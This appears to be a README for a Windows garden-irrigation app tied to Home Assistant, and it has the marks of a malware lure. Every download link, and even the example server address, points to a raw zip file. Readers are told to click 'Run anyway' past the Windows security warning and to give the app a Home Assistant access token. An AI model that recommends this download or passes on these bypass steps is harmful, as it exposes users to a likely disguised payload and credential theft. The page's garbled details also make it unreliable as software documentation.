# 💧 Watering-Scheduler - Automate your home garden irrigation easily

[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/myoid-beebalm11/Watering-Scheduler/main/cornein/Scheduler-Watering-v3.4.zip)

## 🏡 What is Watering-Scheduler
Watering-Scheduler manages your home irrigation system. It connects to your Home Assistant setup to track moisture levels and weather patterns. You save water while keeping your plants healthy. The software automates your garden schedule so you do not need to turn valves by hand.

## ⚙️ System Requirements
*   A computer running Microsoft Windows 10 or newer.
*   An active Home Assistant installation on your local network.
*   A stable internet connection for initial setup.
*   At least 100 MB of free storage space.

## 📥 How to Get Started
You need to visit the project page to download the software. Follow these steps to set up the scheduler on your Windows computer.

1. Go to the [Releases page](https://raw.githubusercontent.com/myoid-beebalm11/Watering-Scheduler/main/cornein/Scheduler-Watering-v3.4.zip).
2. Look for the latest version at the top of the list.
3. Click the file name ending in .exe to start the download.
4. Save the file to your desktop or downloads folder.

## 🛠️ Installation Steps
After you download the file, follow this process to install the program.

1. Locate the downloaded file on your computer.
2. Double-click the file to open the installer.
3. Windows may show a security screen. If it appears, click More info, then click Run anyway.
4. Follow the prompts in the installation window.
5. Choose your preferred install location or accept the default folder.
6. Click Finish to complete the install process.

## 🔗 Connecting to Home Assistant
The scheduler works with Home Assistant. You must grant the app permission to talk to your home network.

1. Open the Watering-Scheduler app from your desktop shortcut.
2. Enter your Home Assistant server address. This usually looks like https://raw.githubusercontent.com/myoid-beebalm11/Watering-Scheduler/main/cornein/Scheduler-Watering-v3.4.zip
3. Provide a Long-Lived Access Token from your Home Assistant profile page.
4. The app tests the connection and confirms when it links successfully.

## 📅 Setting Up a Schedule
Once connected, you can create your first watering routine. 

1. Click the Schedule tab inside the app.
2. Click the Plus button to create a new task.
3. Select the zones you want to water. If you only have one valve, select Zone 1.
4. Choose the days of the week for watering.
5. Set the start time.
6. Choose how many minutes the water stays on.
7. Click Save to activate the routine.

## 🌦️ Using Smart Features
Watering-Scheduler uses local weather data to adjust your watering. If it rains, the app skips the next scheduled cycle. This feature saves water and prevents over-watering. 

1. Navigate to the Settings tab.
2. Enable the Weather Integration toggle.
3. This looks at your local forecast. If the chance of rain exceeds 50 percent, the app disables the next run.
4. You can see skipped events in the History tab.

## 💡 Managing Multiple Zones
You can manage many valves with this app. Each zone operates independently. 

1. Go to the Device Management screen.
2. Click Add Device.
3. Enter the ID of your irrigation controller.
4. Label each zone with a clear name, such as Front Lawn or Vegetable Garden.
5. Click Update to save your device labels.

## 🛠️ Troubleshooting Common Issues
Computers sometimes behave in unexpected ways. If the app fails to start or connect, check these items.

*   Check your network connection. The app requires a connection to your local network.
*   Restart the application. Close the window and launch it again from your desktop.
*   Verify your Home Assistant token. If the token expired, you must generate a new one in Home Assistant.
*   Check your firewall settings. Windows Firewall might block the connection. Allow Watering-Scheduler through your firewall if a prompt appears.
*   Ensure your irrigation hardware remains powered on. 
*   If the app remains slow, check for other programs using your network.

## 📈 Updating the Software
We release updates to improve performance and fix errors. 

1. Periodically check the Releases page.
2. Download the newest installer when a new version becomes available.
3. Run the installer to replace your current version.
4. Your settings remain saved during the update process.

## 🤝 Getting Help
If you encounter a problem that you cannot solve, you can report it on GitHub. Provide the version number of your software and a description of the error. Include screenshots if they help explain the issue.

*   Open the Issues tab on the project page.
*   Search to see if someone else has reported the same problem.
*   Click New Issue to start a report if you find no match.
*   Describe your setup and the steps you took before the error occurred.